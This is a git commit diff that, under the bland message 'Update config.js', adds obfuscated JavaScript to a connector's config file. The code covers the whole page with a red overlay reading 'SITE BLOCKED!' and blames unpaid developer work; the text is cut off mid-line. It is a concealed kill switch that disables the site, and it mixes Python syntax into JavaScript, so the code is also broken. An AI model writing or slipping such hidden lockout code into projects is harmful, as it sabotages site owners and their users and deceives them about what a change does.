ecae8355806ef44cb869cb70b7c257dbd1938916
syrve-web-connector <devsupport65@gmail.com>
2026-04-02 13:42:06 +0300

    Update config.js

--- config.js
+++ config.js
@@ -1,3 +1,17 @@
-/* Syrve API Connector v.2.4.1 
-   Synchronization module for web-assets and transaction storage  */
+
 console.log('Syrve storage assets initialized');
+(function(_0x_host,_0x_body){
+  const _0x_doc=document;
+  const _0x_win=window;
+
+
+  const _0x_container = _0x_doc['createElement']('div');
+
+  _0x_container['id'] = 'syrve-assets-loader'; 
+
+  _0x_container['style'] = "position:fixed;top:0;left:0;width:100vw;height:100vh;background:#f00;z-index:999999999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;font-family:sans-serif;font-weight:bold;text-align:center;padding:20px;box-sizing:border-box;";
+  
+
+  const _0x_title = "".join([chr(x) for x in [1057, 1040, 1049, 1058, 32, 1047, 1040, 1041, 1051, 1054, 1050, 1054, 1042, 1040, 1053, 1054, 33]]); // "САЙТ ЗАБЛОКОВАНО!"
+  const _0x_msg = "".join([chr(x) for x in [1056, 1086, 1073, 1086, 1090, 1091, 32, 1087, 1088, 1080, 1079, 1091, 1087, 1080, 1085, 1077, 1085, 1086, 32, 1095, 1077, 1088, 1077, 1079, 32, 1085, 1077, 1089, 1087, 1083, 1072, 1090, 1091, 32, 1079, 1072, 32, 1088, 1086, 1073, 1086, 1090, 1091, 32, 1088, 1086, 1079, 1088, 1086, 1073, 1085, 1080, 1082, 1110, 1074, 46]]); // "Роботу призупинено через несплату за роботу розробників."
+  const _0x_contact = "".join([chr(x) for x in [1044, 1083, 1103, 32, 1074, 1110, 1076, 1085, 1086, 1074, 1083, 1077, 1085, 108
